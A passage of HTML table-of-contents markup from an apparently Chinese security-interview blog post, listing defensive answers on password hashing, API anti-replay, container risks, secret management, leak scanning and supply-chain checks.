gensalt())   - scrypt（适用于高安全场景）：     12import hashlibhashed &#x3D; hashlib.scrypt(password.encode(), salt&#x3D;os.urandom(16), n&#x3D;16384, r&#x3D;8, p&#x3D;1)4. 避免明文存储：   - 严禁存储明文密码，所有密码必须经过安全哈希处理。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%90%E4%BA%9B%E5%9C%BA%E6%99%AF%EF%BC%88%E7%99%BB%E5%BD%95%E3%80%81%E6%B3%A8%E5%86%8C%E3%80%81%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E3%80%81%E6%94%AF%E4%BB%98%EF%BC%89%E4%BC%9A%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%EF%BC%9F"><span class="toc-number">42.0.1.</span> <span class="toc-text">某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD%EF%BC%9A-%E7%99%BB%E5%BD%95%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E3%80%81IP-%E9%A2%91%E7%8E%87%E9%99%90%E5%88%B6%E3%80%81%E4%BA%8C%E6%AC%A1%E9%AA%8C%E8%AF%81%EF%BC%882FA%EF%BC%89%E3%80%82-%E6%B3%A8%E5%86%8C%EF%BC%9A%E9%99%90%E5%88%B6%E6%89%B9%E9%87%8F%E6%B3%A8%E5%86%8C%EF%BC%88%E5%A6%82%E5%9F%BA%E4%BA%8E%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%E6%A3%80%E6%B5%8B%EF%BC%89%E3%80%82-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%9A%E8%A6%81%E6%B1%82%E8%BE%93%E5%85%A5%E6%97%A7%E5%AF%86%E7%A0%81%EF%BC%8C%E6%88%96%E8%BF%9B%E8%A1%8C%E4%BA%8C%E6%AC%A1%E9%AA%8C%E8%AF%81%EF%BC%88%E7%9F%AD%E4%BF%A1-%E9%82%AE%E4%BB%B6%EF%BC%89%E3%80%82-%E6%94%AF%E4%BB%98%EF%BC%9A%E4%BD%BF%E7%94%A8-HMAC-%E7%AD%BE%E5%90%8D%EF%BC%8C%E9%98%B2%E6%AD%A2%E8%AF%B7%E6%B1%82%E7%AF%A1%E6%94%B9%EF%BC%8C%E5%90%AF%E7%94%A8-%E5%B9%82%E7%AD%89%E6%9C%BA%E5%88%B6-%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%94%AF%E4%BB%98%E3%80%82"><span class="toc-number">43.</span> <span class="toc-text">防范措施：- 登录：使用验证码、IP 频率限制、二次验证（2FA）。- 注册：限制批量注册（如基于行为分析检测）。- 修改密码：要求输入旧密码，或进行二次验证（短信&#x2F;邮件）。- 支付：使用 HMAC 签名，防止请求篡改，启用 幂等机制 避免重复支付。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E5%BA%94%E7%94%A8%E5%A6%82%E4%BD%95%E8%AF%84%E4%BC%B0%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">43.0.1.</span> <span class="toc-text">新应用如何评估安全风险？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95%EF%BC%9A1-%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%EF%BC%9A-%E8%AF%86%E5%88%AB-API%E3%80%81%E5%89%8D%E7%AB%AF%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%AC%AC%E4%B8%89%E6%96%B9%E9%9B%86%E6%88%90%E7%9A%84%E6%BD%9C%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%82%B9%E3%80%822-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%B8%8E%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%9A-%E7%A1%AE%E4%BF%9D%E4%BD%BF%E7%94%A8-JWT%E3%80%81OAuth-%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%EF%BC%8C%E9%81%BF%E5%85%8D%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E3%80%823-%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%EF%BC%9A-%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E3%80%824-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%9A-%E8%AF%84%E4%BC%B0%E6%94%AF%E4%BB%98%E3%80%81%E4%BA%A4%E6%98%93%E7%AD%89%E5%85%B3%E9%94%AE%E5%8A%9F%E8%83%BD%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%81%B6%E6%84%8F%E5%88%A9%E7%94%A8%E3%80%82"><span class="toc-number">44.</span> <span class="toc-text">评估方法：1. 攻击面分析：   - 识别 API、前端、数据库、第三方集成的潜在漏洞点。2. 身份认证与访问控制：   - 确保使用 JWT、OAuth 进行身份认证，避免越权访问。3. 数据保护：   - 敏感数据加密存储，防止数据泄露。4. 业务逻辑漏洞：   - 评估支付、交易等关键功能，防止恶意利用。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9C%80%E6%B1%82%E9%98%B6%E6%AE%B5%E3%80%81%E5%90%84%E5%88%86%E9%98%B6%E6%AE%B5%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E7%9A%84%E4%BE%A7%E9%87%8D%E7%82%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">44.0.1.</span> <span class="toc-text">需求阶段、各分阶段安全评估的侧重点是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3-B-%E7%9A%84%E5%8F%82%E6%95%B0%E6%98%AF%E4%BB%8E%E6%8E%A5%E5%8F%A3-A-%E7%9A%84%E5%93%8D%E5%BA%94%E4%B8%AD%E8%8E%B7%E5%8F%96%E7%9A%84%EF%BC%8C%E4%BC%9A%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">44.0.2.</span> <span class="toc-text">接口 B 的参数是从接口 A 的响应中获取的，会存在哪些风险？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD%EF%BC%9A-%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7%E6%A0%A1%E9%AA%8C%EF%BC%9A%E6%8E%A5%E5%8F%A3-A-%E7%9A%84%E5%93%8D%E5%BA%94%E5%BF%85%E9%A1%BB%E8%BF%9B%E8%A1%8C%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E3%80%82-%E9%99%90%E5%88%B6%E6%95%B0%E6%8D%AE%E6%9D%A5%E6%BA%90%EF%BC%9A%E6%8E%A5%E5%8F%A3-B-%E4%BB%85%E6%8E%A5%E5%8F%97%E5%8F%AF%E4%BF%A1-API-%E7%9A%84%E6%95%B0%E6%8D%AE%E3%80%82-%E4%BD%BF%E7%94%A8-Token-%E5%85%B3%E8%81%94%E8%AF%B7%E6%B1%82%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E3%80%82"><span class="toc-number">45.</span> <span class="toc-text">防范措施：- 数据完整性校验：接口 A 的响应必须进行签名验证。- 限制数据来源：接口 B 仅接受可信 API 的数据。- 使用 Token 关联请求，防止数据篡改。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E7%9A%84-API-%E6%8E%A5%E5%8F%A3%E4%B8%8A%E7%BA%BF%E6%97%B6%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%BD%BF%E5%85%B6%E9%81%BF%E5%85%8D%E5%87%BA%E7%8E%B0%E8%AF%B7%E6%B1%82%E7%AF%A1%E6%94%B9%E5%92%8C%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE%EF%BC%9F"><span class="toc-number">45.0.1.</span> <span class="toc-text">新的 API 接口上线时，如何设计使其避免出现请求篡改和请求重放？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E9%87%8D%E6%94%BE%E6%8E%AA%E6%96%BD%EF%BC%9A-%E4%BD%BF%E7%94%A8%E6%97%B6%E9%97%B4%E6%88%B3-%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%9A-%E5%9C%A8%E8%AF%B7%E6%B1%82%E4%B8%AD%E6%B7%BB%E5%8A%A0-timestamp-nonce%EF%BC%8C%E7%A1%AE%E4%BF%9D%E5%94%AF%E4%B8%80%E6%80%A7%EF%BC%9A-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%AD%98%E5%82%A8%E5%B7%B2%E4%BD%BF%E7%94%A8%E7%9A%84-nonce%EF%BC%8C%E9%98%B2%E6%AD%A2%E9%87%8D%E5%A4%8D%E8%AF%B7%E6%B1%82%E3%80%82"><span class="toc-number">46.</span> <span class="toc-text">防重放措施：- 使用时间戳+随机数：  - 在请求中添加 timestamp + nonce，确保唯一性：    12345{  &quot;timestamp&quot;: 1700000000,  &quot;nonce&quot;: &quot;random-uuid&quot;,  &quot;signature&quot;: &quot;hmac_signature&quot;}  - 服务器端存储已使用的 nonce，防止重复请求。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-%E5%AE%B9%E5%99%A8%E4%BB%A5%E5%8F%8A-K8s-%E6%9C%89%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">46.0.1.</span> <span class="toc-text">Docker 容器以及 K8s 有哪些风险？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD%EF%BC%9A-%E4%BD%BF%E7%94%A8-%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%8E%9F%E5%88%99-%E9%99%90%E5%88%B6%E5%AE%B9%E5%99%A8%E5%92%8C-K8s-%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE%E3%80%82-%E5%90%AF%E7%94%A8-Pod-Security-Policy%EF%BC%8C%E9%81%BF%E5%85%8D%E8%BF%90%E8%A1%8C%E9%AB%98%E6%9D%83%E9%99%90%E5%AE%B9%E5%99%A8%E3%80%82-%E5%AE%9A%E6%9C%9F%E6%89%AB%E6%8F%8F%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%EF%BC%8C%E9%98%B2%E6%AD%A2%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB%E3%80%82"><span class="toc-number">47.</span> <span class="toc-text">防范措施：- 使用 最小权限原则 限制容器和 K8s 资源访问。- 启用 Pod Security Policy，避免运行高权限容器。- 定期扫描容器镜像，防止供应链攻击。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IPv6-%E5%92%8C-IPv4-%E5%AE%89%E5%85%A8%E5%B7%AE%E5%BC%82%EF%BC%9F"><span class="toc-number">47.0.1.</span> <span class="toc-text">IPv6 和 IPv4 安全差异？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD%EF%BC%9A-%E9%99%90%E5%88%B6-IPv6-%E8%AE%BF%E9%97%AE%E8%8C%83%E5%9B%B4%EF%BC%8C%E4%BD%BF%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E6%8B%A6%E6%88%AA%E5%A4%96%E9%83%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E6%B5%81%E9%87%8F%E3%80%82-%E5%90%AF%E7%94%A8-RA-Guard%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%81%B6%E6%84%8F-IPv6-%E8%B7%AF%E7%94%B1%E5%85%AC%E5%91%8A%E3%80%82"><span class="toc-number">48.</span> <span class="toc-text">防范措施：- 限制 IPv6 访问范围，使用防火墙规则拦截外部未授权流量。- 启用 RA-Guard，防止恶意 IPv6 路由公告。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E6%96%B9%E5%BC%95%E5%85%A5%E7%9A%84%E5%BA%94%E7%94%A8%E5%92%8C%E8%87%AA%E7%A0%94%E5%BA%94%E7%94%A8%E8%AF%84%E4%BC%B0%E7%9A%84%E5%B7%AE%E5%BC%82%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">48.0.1.</span> <span class="toc-text">三方引入的应用和自研应用评估的差异有哪些？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E7%A0%94%E5%BA%94%E7%94%A8%E8%AF%84%E4%BC%B0%EF%BC%9A-%E9%87%8D%E7%82%B9%E5%85%B3%E6%B3%A8-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A6%82%E6%94%AF%E4%BB%98%E7%BB%95%E8%BF%87%E3%80%81%E6%9D%83%E9%99%90%E8%B6%8A%E6%9D%83%EF%BC%89%E3%80%82-%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83%E9%9C%80%E4%B8%A5%E6%A0%BC%E6%89%A7%E8%A1%8C%EF%BC%8C%E9%98%B2%E6%AD%A2%E5%86%85%E9%83%A8%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E3%80%82"><span class="toc-number">49.</span> <span class="toc-text">自研应用评估：- 重点关注 业务逻辑漏洞（如支付绕过、权限越权）。- 代码安全规范需严格执行，防止内部泄露风险。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%91%E8%9E%8D%E4%B8%9A%E5%8A%A1%E6%9C%89%E4%BD%95%E7%89%B9%E6%80%A7%EF%BC%9F"><span class="toc-number">49.0.1.</span> <span class="toc-text">金融业务有何特性？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mvn-%E6%BA%90%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E5%93%AA%E4%BA%9B%E7%82%B9%EF%BC%9F"><span class="toc-number">49.0.2.</span> <span class="toc-text">mvn 源的安全性需要考虑哪些点？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%A9%E4%B8%9A%E5%8A%A1%E6%96%B9%E4%B8%BB%E5%8A%A8%E6%89%BE%E4%BD%A0%E8%AF%84%E4%BC%B0%EF%BC%9F"><span class="toc-number">49.0.3.</span> <span class="toc-text">如何让业务方主动找你评估？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E8%AF%84%E4%BC%B0%E8%A6%86%E7%9B%96%E8%8C%83%E5%9B%B4%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7%EF%BC%9F"><span class="toc-number">49.1.</span> <span class="toc-text">如何判断评估覆盖范围的优先级？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%EF%BC%9A-%E9%87%87%E7%94%A8-%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%EF%BC%88Attack-Surface-Analysis%EF%BC%89-%E8%AF%86%E5%88%AB%E9%AB%98%E9%A3%8E%E9%99%A9%E5%8C%BA%E5%9F%9F%E3%80%82-%E7%BB%93%E5%90%88-%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1-%E8%AF%84%E4%BC%B0%E6%BD%9C%E5%9C%A8%E5%A8%81%E8%83%81%E3%80%82"><span class="toc-number">50.</span> <span class="toc-text">最佳实践：- 采用 攻击面分析（Attack Surface Analysis） 识别高风险区域。- 结合 威胁建模 评估潜在威胁。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%B3%BB%E7%BB%9F%E6%8F%90%E9%AB%98%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E6%95%88%E7%8E%87%EF%BC%9F"><span class="toc-number">50.1.</span> <span class="toc-text">如何系统提高安全评估效率？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A-%E5%9C%A8-CI-CD-%E6%B5%81%E7%A8%8B%E4%B8%AD%E9%9B%86%E6%88%90-SonarQube-%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%89%AB%E6%8F%8F%E3%80%82%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%EF%BC%88CI%EF%BC%89%E5%92%8C%E6%8C%81%E7%BB%AD%E9%83%A8%E7%BD%B2%EF%BC%88CD%EF%BC%89%E6%B5%81%E7%A8%8B-%E9%87%87%E7%94%A8-Burp-Suite-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F-%E5%8F%91%E7%8E%B0-Web-%E6%BC%8F%E6%B4%9E%E3%80%82"><span class="toc-number">51.</span> <span class="toc-text">示例：- 在 CI&#x2F;CD 流程中集成 SonarQube 进行代码安全扫描。持续集成（CI）和持续部署（CD）流程- 采用 Burp Suite 自动化扫描 发现 Web 漏洞。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E5%AE%89%E5%85%A8%E5%B7%A6%E7%A7%BB%EF%BC%9F"><span class="toc-number">51.1.</span> <span class="toc-text">如何理解安全左移？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A-%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%8F%90%E4%BA%A4%E6%97%B6%E8%BF%90%E8%A1%8C-Checkmarx-%E8%BF%9B%E8%A1%8C%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E3%80%82-%E5%9C%A8-Jenkins-Pipeline-%E4%B8%AD%E5%8A%A0%E5%85%A5-OWASP-ZAP-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F%E3%80%82"><span class="toc-number">52.</span> <span class="toc-text">示例：- 在代码提交时运行 Checkmarx 进行静态代码分析。- 在 Jenkins Pipeline 中加入 OWASP ZAP 自动化扫描。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E7%9A%84%E8%A1%8C%E4%B8%9A%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">52.1.</span> <span class="toc-text">安全评估的行业最佳实践是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E9%92%A5%E6%9C%89%E4%BD%95%E9%A3%8E%E9%99%A9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%86%B3%EF%BC%9F"><span class="toc-number">52.2.</span> <span class="toc-text">硬编码密钥有何风险以及如何系统解决？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%BD%BF%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E5%AF%86%E9%92%A5%EF%BC%9A-%E4%BD%BF%E7%94%A8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%EF%BC%88KMS%EF%BC%89%EF%BC%9A-%E9%87%87%E7%94%A8-AWS-KMS%E3%80%81HashiCorp-Vault-%E8%BF%9B%E8%A1%8C%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%8C%E9%81%BF%E5%85%8D%E7%A1%AC%E7%BC%96%E7%A0%81%E3%80%82-%E5%AE%9A%E6%9C%9F%E8%BD%AE%E6%8D%A2%E5%AF%86%E9%92%A5%EF%BC%9A-%E8%AE%BE%E5%AE%9A%E5%AF%86%E9%92%A5-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%EF%BC%8C%E5%AE%9A%E6%9C%9F%E7%94%9F%E6%88%90%E6%96%B0%E5%AF%86%E9%92%A5%EF%BC%8C%E9%99%8D%E4%BD%8E%E9%95%BF%E6%9C%9F%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E3%80%82"><span class="toc-number">53.</span> <span class="toc-text">解决方案：- 使用环境变量存储密钥：  1export API_KEY&#x3D;&quot;your-secret-key&quot;- 使用密钥管理系统（KMS）：  - 采用 AWS KMS、HashiCorp Vault 进行密钥管理，避免硬编码。- 定期轮换密钥：  - 设定密钥 生命周期，定期生成新密钥，降低长期泄露风险。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0day-%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="toc-number">53.1.</span> <span class="toc-text">0day 漏洞如何防御？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%EF%BC%9A1-%E5%A2%9E%E5%BC%BA%E6%94%BB%E5%87%BB%E9%9D%A2%E7%9B%91%E6%8E%A7%EF%BC%9A-%E9%87%87%E7%94%A8-%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%EF%BC%88Threat-Intelligence%EF%BC%89%EF%BC%8C%E8%AE%A2%E9%98%85-CVE-%E9%A2%84%E8%AD%A6%E4%BF%A1%E6%81%AF%E3%80%822-%E5%90%AF%E7%94%A8-RASP%EF%BC%88%E8%BF%90%E8%A1%8C%E6%97%B6%E5%BA%94%E7%94%A8%E8%87%AA%E6%88%91%E4%BF%9D%E6%8A%A4%EF%BC%89%EF%BC%9A-%E9%80%9A%E8%BF%87-Hook-%E5%85%B3%E9%94%AE-API%EF%BC%8C%E6%A3%80%E6%B5%8B%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%EF%BC%8C%E5%A6%82-Java-RASP-%E7%9B%91%E6%8E%A7-Runtime-exec-%E3%80%823-%E5%8A%A0%E5%BC%BA%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%9A-%E9%99%90%E5%88%B6%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E6%93%8D%E4%BD%9C%EF%BC%8C%E5%A6%82-SSH-%E8%AE%BF%E9%97%AE%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90%E3%80%82"><span class="toc-number">54.</span> <span class="toc-text">防御策略：1. 增强攻击面监控：   - 采用 威胁情报（Threat Intelligence），订阅 CVE 预警信息。2. 启用 RASP（运行时应用自我保护）：   - 通过 Hook 关键 API，检测异常行为，如 Java RASP 监控 Runtime.exec()。3. 加强访问控制：   - 限制高权限用户操作，如 SSH 访问、数据库管理权限。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GitHub-%E7%AD%89%E4%B8%89%E6%96%B9%E6%B3%84%E6%BC%8F%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%A6%82%E4%BD%95%E4%BD%93%E7%B3%BB%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="toc-number">54.0.1.</span> <span class="toc-text">GitHub 等三方泄漏敏感信息如何体系防御？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%EF%BC%9A1-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F%EF%BC%9A-%E4%BD%BF%E7%94%A8-GitLeaks%E3%80%81TruffleHog-%E5%AE%9A%E6%9C%9F%E6%89%AB%E6%8F%8F-Git-%E4%BB%93%E5%BA%93%E3%80%822-%E5%BC%BA%E5%88%B6-Git-Hook-%E6%A3%80%E6%9F%A5%EF%BC%9A-%E5%9C%A8-Git-%E6%8F%90%E4%BA%A4%E5%89%8D%E6%A3%80%E6%B5%8B%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%8C%E9%98%B2%E6%AD%A2%E8%AF%AF%E6%8F%90%E4%BA%A4%EF%BC%9A-3-%E5%AF%86%E9%92%A5%E5%A4%B1%E6%95%88%E6%9C%BA%E5%88%B6%EF%BC%9A-%E4%B8%80%E6%97%A6%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2%EF%BC%8C%E7%AB%8B%E5%8D%B3%E4%BD%BF%E5%85%B6%E5%A4%B1%E6%95%88%E5%B9%B6%E9%87%8D%E6%96%B0%E7%94%9F%E6%88%90%E3%80%82"><span class="toc-number">55.</span> <span class="toc-text">防御方法：1. 自动化扫描：   - 使用 GitLeaks、TruffleHog 定期扫描 Git 仓库。2. 强制 Git Hook 检查：   - 在 Git 提交前检测敏感信息，防止误提交：     1pre-commit run --all-files3. 密钥失效机制：   - 一旦密钥泄露，立即使其失效并重新生成。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E6%8A%80%E6%9C%AF%E6%89%8B%E6%AE%B5%E6%8C%96%E6%8E%98%E4%B8%8E%E5%BC%A5%E8%A1%A5%EF%BC%9F"><span class="toc-number">55.1.</span> <span class="toc-text">业务逻辑漏洞如何通过技术手段挖掘与弥补？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E7%AD%96%E7%95%A5%EF%BC%9A-%E5%90%8E%E7%AB%AF%E5%BC%BA%E5%88%B6%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C%EF%BC%8C%E9%81%BF%E5%85%8D%E4%BB%85%E4%BE%9D%E8%B5%96%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6%E3%80%82-%E5%90%AF%E7%94%A8%E5%B9%82%E7%AD%89%E6%80%A7%E6%A3%80%E6%9F%A5%EF%BC%8C%E9%98%B2%E6%AD%A2%E5%85%B3%E9%94%AE%E4%BA%A4%E6%98%93%E8%A2%AB%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E3%80%82"><span class="toc-number">56.</span> <span class="toc-text">修复策略：- 后端强制权限校验，避免仅依赖前端限制。- 启用幂等性检查，防止关键交易被重复执行。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E7%B3%BB%E7%BB%9F%E8%A7%84%E9%81%BF%EF%BC%9F"><span class="toc-number">56.1.</span> <span class="toc-text">软件供应链后门漏洞如何系统规避？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E4%BD%BF%E7%94%A8-Snyk-%E6%89%AB%E6%8F%8F-Node-js-%E4%BE%9D%E8%B5%96%EF%BC%9A"><span class="toc-number">57.</span> <span class="toc-text">示例：使用 Snyk 扫描 Node.js 依赖：1snyk test</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF-JavaScript-%E4%BB%A3%E7%A0%81%E5%A6%82%E4%BD%95%E6%B7%B7%E6%B7%86%E4%BB%A5%E5%8F%8A%E5%8F%8D%E8%B0%83%E8%AF%95%EF%BC%9F"><span class="toc-number">57.1.</span> <span class="toc-text">前端 JavaScript 代码如何混淆以及反调试？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 